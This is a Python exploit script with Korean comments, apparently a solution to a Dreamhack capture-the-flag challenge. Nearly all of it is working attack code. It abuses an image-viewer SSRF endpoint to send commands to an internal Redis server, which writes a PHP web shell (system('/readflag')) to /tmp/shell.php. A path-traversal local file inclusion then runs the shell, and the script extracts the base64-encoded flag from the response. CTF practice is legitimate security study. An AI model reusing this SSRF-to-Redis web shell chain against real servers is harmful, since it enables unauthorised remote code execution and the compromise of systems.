import requests
import base64
import re
import time

# 1. 문제 서버의 Python SSRF 취약점 엔드포인트
TARGET_URL = "http://host8.dreamhack.games:19093/img_viewer"

# 2. 내부망(127.0.0.1)으로 보낼 페이로드 목록
# Node.js Express가 확실하게 배열로 파싱하도록 log_query[1][] 형태로 수정했습니다.
payloads = [
    # Step 1: Redis 데이터 저장 경로를 /tmp 로 변경
    "http://127.0.0.1:3000/show_logs?log_query[0]=config&log_query[1][]=set&log_query[1][]=dir&log_query[1][]=/tmp",
    
    # Step 2: Redis 백업 파일명을 shell.php 로 설정
    "http://127.0.0.1:3000/show_logs?log_query[0]=config&log_query[1][]=set&log_query[1][]=dbfilename&log_query[1][]=shell.php",
    
    # Step 3: 메모리에 PHP 웹쉘 코드 삽입
    "http://127.0.0.1:3000/show_logs?log_query[0]=set&log_query[1][]=webshell&log_query[1][]=%0A%0A%3C%3Fphp%20system('/readflag')%3B%20%3F%3E%0A%0A",
    
    # Step 4: 메모리 상태를 /tmp/shell.php 파일로 디스크에 저장
    "http://127.0.0.1:3000/show_logs?log_query[0]=save",
    
    # Step 5: PHP LFI 취약점을 이용해 생성된 /tmp/shell.php 를 실행
    "http://127.0.0.1:80/?page=../../../../../../tmp/shell"
]

print("[*] 익스플로잇을 시작합니다...")

for i, payload_url in enumerate(payloads):
    print(f"[*] Payload {i+1}/5 전송 중...")
    
    try:
        response = requests.post(TARGET_URL, data={"url": payload_url})
        
        # 마지막 LFI 요청의 결과에서 플래그 추출 시도
        if i == 4:
            print("[*] 최종 응답 분석 중...")
            flag_found = False
            
            # 응답 텍스트 내에서 Base64로 추정되는 긴 문자열을 모두 추출
            b64_strings = re.findall(r'[a-zA-Z0-9+/=]{30,}', response.text)
            
            for b64 in b64_strings:
                try:
                    # 디코딩 시도
                    decoded_text = base64.b64decode(b64).decode('utf-8', errors='ignore')
                    
                    # 디코딩된 문자열에서 플래그 패턴 찾기
                    flag_match = re.search(r'DH\{.*?\}', decoded_text)
                    if flag_match:
                        print("\n[+] 성공! 플래그를 획득했습니다:")
                        print("=========================================")
                        print(flag_match.group(0))
                        print("=========================================\n")
                        flag_found = True
                        break
                except Exception:
                    continue
            
            if not flag_found:
                print("\n[-] 플래그를 찾지 못했습니다. 서버가 에러를 반환했을 수 있습니다.")
                print("[*] 디버깅을 위해 서버의 실제 응답 앞부분을 출력합니다:")
                print("-" * 50)
                # HTML 태그 등 확인을 위해 응답 텍스트 출력
                print(response.text[:1500])
                print("-" * 50)
                
        time.sleep(1) # 서버 과부하 방지

    except Exception as e:
        print(f"[-] 요청 중 에러 발생: {e}")